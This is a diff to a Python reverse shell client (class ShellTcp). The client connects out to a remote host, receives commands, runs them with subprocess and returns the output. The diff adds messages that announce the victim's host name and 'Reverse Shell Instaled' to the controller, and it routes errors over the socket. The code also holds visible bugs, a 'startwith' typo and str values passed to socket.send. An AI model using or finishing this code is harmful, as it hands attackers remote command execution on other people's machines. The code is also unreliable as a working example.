@@ -17,20 +17,21 @@ class ShellTcp:
     try:
       self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       self.socket.connect((self.host, self.port))
+      host_name, port_name = self.socket.getsockname()
+      self.socket.send(f"{Fore.RED}[+] {Fore.YELLOW}HOST > {Fore.RESET}{host_name}\n")
+      self.socket.send(f"{Fore.RED}[+] {Fore.YELLOW}Reverse Shell {Fore.RESET} Instaled\n")
     except Exception as e:
-      print(f"erro {e}")
+      self.socket.send(f"[-] erro {e}")
   def listen(self):
     while True:
       try:
         self.data = self.socket.recv(1024).decode().strip()
         if self.data == "/exit":
           return
-        if self.data == "/clear":
-          os.system("clear")
         else:
           self.cmd(self.socket, self.data)
       except Exception as e:
-        print(f"error {e}")
+        self.socket.send(f"[-] error {e}")
   def cmd(self, server, data):
     try:
       if data.startwith("cd "):
@@ -47,7 +48,7 @@ class ShellTcp:
         p.stdout.read() + p.stderr.read() + b"\n"
       )
     except Exception as e:
-      print(f"error {e}")
+      self.socket.send(f"[-] error {e}")
       return
 
 if __name__ == "__main__":
